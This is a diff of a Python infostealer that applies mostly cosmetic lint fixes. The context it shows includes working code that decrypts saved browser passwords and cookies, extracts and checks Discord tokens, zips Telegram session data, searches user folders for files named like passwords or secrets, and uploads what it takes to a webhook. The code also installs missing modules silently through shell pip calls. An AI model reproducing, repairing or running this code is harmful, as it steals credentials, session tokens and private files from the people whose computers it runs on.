@@ -8,18 +8,15 @@ import subprocess
 import platform
 import socket
 import getpass
-import platform
 import psutil
-import ctypes
 from base64 import b64decode
-from json import loads as json_loads, load
+from json import loads as json_loads
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from sys import executable
 from sqlite3 import connect as sql_connect
 from urllib.request import Request, urlopen
 from json import loads, dumps
 from zipfile import ZipFile
-from sys import argv
 
 from Crypto.Cipher import AES
 
@@ -39,7 +36,7 @@ except ModuleNotFoundError:
     for modl in requirements:
         try:
             __import__(modl[0])
-        except:
+        except Exception:
             subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
             time.sleep(3)
             
@@ -55,7 +52,7 @@ def get_ip():
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode="w", encoding="utf-8") as f:
-        f.write(f"< - lol -->\n\n")
+        f.write("< - lol -->\n\n")
         for line in data:
             if line[0] != "":
                 f.write(f"{line}\n")
@@ -187,10 +184,7 @@ def LoadUrlib(hook, data="", files="", headers=""):
         print(r)
         return r
 
-    tempfold = (
-        temp + "wp" +
-        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
-                for i in range(8)) + ".db")
+
 
 def globalInfo():
     ip = get_ip()
@@ -313,7 +307,7 @@ def GetTokens(path, arg):
                     for token in re.findall(regex, line):
                         global Tokens
                         if dclass.checkToken(token):
-                            if not token in Tokens:
+                            if token not in Tokens:
                                 Tokens += token
                                 dclass.uploadToken(token)
 
@@ -359,7 +353,7 @@ def GetPasswords(path, arg):
                     tmp = wa
                     wa = tmp.split("[")[1].split("]")[0]
                 if wa in row[0]:
-                    if not old in paswWords:
+                    if old not in paswWords:
                         paswWords.append(old)
             Passw.append(
                 f"URL: {row[0]}|Username: {row[1]}|Password: {DecryptValue(row[2], master_key)}"
@@ -462,7 +456,7 @@ def GetDiscord(path, arg):
                     tokenDecoded = DecryptValue(
                         b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                     if dclass.checkToken(tokenDecoded):
-                        if not tokenDecoded in Tokens:
+                        if tokenDecoded not in Tokens:
                             # print(token)
                             Tokens += tokenDecoded
                             # writeforfile(Tokens, 'tokens')
@@ -545,8 +539,8 @@ def ZipTelegram(path, arg, procc):
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
-        if (not ".zip" in file and not "tdummy" in file
-                and not "user_data" in file and not "webview" in file):
+        if (".zip" not in file and "tdummy" not in file
+                and "user_data" not in file and "webview" not in file):
             zf.write(pathC + "/" + file)
     zf.close()
 
@@ -595,7 +589,7 @@ def GetCookies(path, arg):
                     tmp = wa
                     wa = tmp.split("[")[1].split("]")[0]
                 if wa in row[0]:
-                    if not old in cookiWords:
+                    if old not in cookiWords:
                         cookiWords.append(old)
             Cookies.append(
                 f"Host Key: {row[0]}|Name: {row[1]}|Value: {DecryptValue(row[2], master_key)}"
@@ -640,12 +634,12 @@ def ZipThings(path, arg, procc):
 
     zf = ZipFile(f"{pathC}/{name}.zip", "w")
     for file in os.listdir(pathC):
-        if not ".zip" in file:
+        if ".zip" not in file:
             zf.write(pathC + "/" + file)
     zf.close()
 
     # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    lnik = "https://google.com"
+    lnik = "https://google.com" #Unused variable
     os.remove(f"{pathC}/{name}.zip")
     # SEND TO WEBHOOK
 
@@ -870,7 +864,7 @@ def Kiwi():
         user + "\\Desktop", user + "\\Downloads", user + "\\Documents"
     ]
 
-    key_wordsFolder = ["account", "acount", "passw", "secret"]
+    key_wordsFolder = ["account", "acount", "passw", "secret"] #Unused variable
 
     key_wordsFiles = [
         "passw",
